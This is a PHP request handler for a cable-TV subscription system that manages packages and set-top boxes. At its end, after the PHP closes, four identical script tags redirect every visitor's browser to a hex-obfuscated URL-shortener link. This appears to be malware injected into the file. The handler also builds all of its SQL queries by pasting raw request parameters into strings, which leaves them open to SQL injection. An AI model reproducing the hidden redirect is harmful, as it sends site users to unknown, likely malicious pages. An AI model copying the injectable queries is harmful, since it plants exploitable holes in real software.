<?php
require_once("helper.php");
    $subscriber_id      = $_REQUEST['subscriber_id'];
    $headoffice_id      = $_REQUEST['headoffice_id'];
    $stb_no             = $_REQUEST['stb_no'];
    $package_id         = $_REQUEST['package_id'];
    $pkgAmt             = $_REQUEST['package_amount'];
    $action             = $_REQUEST['action'];
    $emp_id             = $_REQUEST['employee_id'];
    $balSmsCount=$sms->pending_sms($headoffice_id);
    $balSms=((empty($balSmsCount))?0:$balSmsCount);
    switch ($action) {
        case 'Packages';
            $sql=$objMisc->getAllRecords('PACKAGE_ID,NAME,PARENT_CHARGES','package_master',"1=1 AND HEADOFFICE_ID='$headoffice_id' ORDER BY PARENT_CHARGES ASC");
            foreach ($sql as $e => $val) {
                $packageArray[]=array(  'PACKAGE_ID'    =>$val['package_id'],
                                        'NAME'          =>$val['name'],
                                        'AMOUNT'        =>$val['parent_charges']);
            }
            if(!empty($sql)){
                    $json= array(
                            'type'=>"1",
                            'packages'=>$packageArray,
                            'msg'=>'success');
                    echo json_encode($json);
                    exit;
            }else{
                $json= array(
                    'type'=>"0",
                    'err_desc'=>'Problem during insertion',
                    'msg'=>'Problem during insertion'
                  );
                echo json_encode($json);
                exit;
            }
            break;
        case 'NewStb';
            if(!empty($subscriber_id) && !empty($stb_no) && !empty($package_id) && !empty($headoffice_id)){
                $cond=$objMisc->GiveValue("HEADOFFICE_ID='$headoffice_id' AND STB_NO='$stb_no'",'AVAILABILITY','subscriptions');
                if(empty($cond)){
                    $stbArr=array('HEADOFFICE_ID'         =>$headoffice_id,
                                  'STB_NO'                =>$stb_no,
                                  'AVAILABILITY'          =>'B',
                                  'ADDED_BY'              =>$emp_id,
                                  'ADDED_TIME'            =>date('Y-m-d H:i:s'));
                    $val            = $objMisc->insert('subscriptions',$stbArr);
                    $subsId=mysqli_insert_id($_SESSION['CONN']);
                    $subsArr=array('HEADOFFICE_ID'         =>$headoffice_id,
                                  'SUBSCRIPTION_ID'       =>$subsId,
                                  'SUBSCRIBER_ID'         =>$subscriber_id,
                                  'PACKAGE_ID'            =>$package_id,
                                  'ADDED_BY'              =>$emp_id,
                                  'ADDED_TIME'            =>date('Y-m-d H:i:s'));
                    $val            = $objMisc->insert('stb_box',$subsArr);
                    $json= array(
                                'type'=>"1",
                                'msg'=>'Settop box added successfully.');
                        echo json_encode($json);
                        exit;
                }else if($cond=='AV'){
                    $subsId=$objMisc->GiveValue("HEADOFFICE_ID='$headoffice_id' AND STB_NO='$stb_no'",'SUBSCRIPTION_ID','subscriptions');
                    $subsArr=array('HEADOFFICE_ID'         =>$headoffice_id,
                                  'SUBSCRIPTION_ID'       =>$subsId,
                                  'SUBSCRIBER_ID'         =>$subscriber_id,
                                  'PACKAGE_ID'            =>$package_id,
                                  'ADDED_BY'              =>$emp_id,
                                  'ADDED_TIME'            =>date('Y-m-d H:i:s'));
                    $val            = $objMisc->insert('stb_box',$subsArr);
                    $stbArr=array('AVAILABILITY'          =>'B');
                    $val            = $objMisc->update('subscriptions',$stbArr,"SUBSCRIPTION_ID='$subsId'");
                    $json= array(
                                'type'=>"1",
                                'msg'=>'Settop box added successfully.');
                        echo json_encode($json);
                        exit;
                }else{
                    $json= array(
                                'type'=>"0",
                                'msg'=>'Settop box already issued.',
                                'err_desc'=>'Settop box already issued.',
                            );
                        echo json_encode($json);
                        exit;
                }
            }
            break;
            case 'StbListing';
                $where="B.SUBSCRIBER_ID='$subscriber_id' AND B.HEADOFFICE_ID='$headoffice_id' AND (B.`REMARKS`NOT LIKE 'Permanent Disconnection%' AND B.`REMARKS` NOT LIKE 'Box is Faulty.%' OR B.`REMARKS` IS NULL) ORDER BY B.`STB_ID` ASC";
                //echo "SELECT S.STB_NO,S.SUBSCRIPTION_ID,P.`NAME`,P.`PARENT_CHARGES` FROM `stb_box` B JOIN `package_master` P ON B.`PACKAGE_ID`=P.`PACKAGE_ID` JOIN `subscriptions` S ON S.SUBSCRIPTION_ID=P.SUBSCRIPTION_ID WHERE $where";
                $sql=$objMisc->getAllRecordsNew("SELECT S.STB_NO,S.SUBSCRIPTION_ID,P.`NAME`,P.`PARENT_CHARGES`,P.`PACKAGE_ID`,B.`STATUS`,B.`REMARKS`,B.`LA_CARTE_NAME`,B.`LA_CARTE_AMOUNT` FROM `stb_box` B JOIN `package_master` P ON B.`PACKAGE_ID`=P.`PACKAGE_ID` JOIN `subscriptions` S ON S.SUBSCRIPTION_ID=B.SUBSCRIPTION_ID WHERE $where");
                if(!empty($sql)){
                    foreach ($sql as $y => $val) {
                        $boxArr[]=array('SUBSCRIPTION_ID'   =>$val['subscription_id'],
                                        'STB_NO'            =>$val['stb_no'],
                                        'STATUS'            =>$val['status'],
                                        'REMARKS'            =>$val['remarks'],
                                        'PACKAGE_ID'        =>$val['package_id'],
                                        'LA_CARTE_NAME'        =>$val['la_carte_name'],
                                        'LA_CARTE_AMOUNT'        =>$val['la_carte_amount'],
                                        'PACKAGE'           =>$val['name'],
                                        'AMOUNT'            =>$val['parent_charges']
                                    );
                    }
                    $json= array(
                                'type'=>"1",
                                'data'=>$boxArr,
                                'msg'=>'Box Listing');
                        echo json_encode($json);
                        exit;
                }else{
                    $json= array(
                                'type'=>"0",
                                'msg'=>'no records found.');
                        echo json_encode($json);
                        exit;
                }
            break;
            case 'UpdateSingleStb';
                $subscription_id=$_REQUEST['subscription_id'];
                $subscriber_id=$_REQUEST['subscriber_id'];
                $cond=$objMisc->GiveValue("HEADOFFICE_ID='$headoffice_id' AND STB_NO='$stb_no'",'SUBSCRIPTION_ID','subscriptions');
                $fakeStb=$objMisc->GiveValue("HEADOFFICE_ID='$headoffice_id' AND SUBSCRIPTION_ID='$subscription_id' AND STB_NO LIKE 'DUM-%'",'STB_NO','subscriptions');
                if(empty($cond) && !empty($fakeStb)){
                    $stbArr=array('STB_NO'                =>$stb_no);
                    $val = $objMisc->update('subscriptions',$stbArr,"HEADOFFICE_ID='$headoffice_id' AND SUBSCRIPTION_ID='$subscription_id'");
                    $json= array(
                                'type'=>"1",
                                'msg'=>'Stb No. updated successfully.');
                        echo json_encode($json);
                        exit;
                }else{
                     $json= array(
                                'type'=>"0",
                                'msg'=>'Stb No. already assigned or entered in system..');
                        echo json_encode($json);
                        exit;
                }
            break;
            case 'UpdateStbPackage';
                $subscription_id=$_REQUEST['subscription_id'];
                $subscriber_id=$_REQUEST['subscriber_id'];
                $cond=$objMisc->GiveValue("HEADOFFICE_ID='$headoffice_id' AND STB_NO='$stb_no'",'SUBSCRIPTION_ID','subscriptions');
                $fakeStb=$objMisc->GiveValue("HEADOFFICE_ID='$headoffice_id' AND SUBSCRIPTION_ID='$subscription_id' AND STB_NO LIKE 'DUM-%'",'STB_NO','subscriptions');
                $stbArr=array('PACKAGE_ID'   =>$package_id);
                $val            = $objMisc->update('stb_box',$stbArr,"HEADOFFICE_ID='$headoffice_id' AND SUBSCRIPTION_ID='$subscription_id' AND SUBSCRIBER_ID='$subscriber_id' AND STATUS='A'");
                $json= array(
                            'type'=>"1",
                            'msg'=>'Stb details updated successfully.');
                echo json_encode($json);
                exit;
                
            break;
    }
   
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>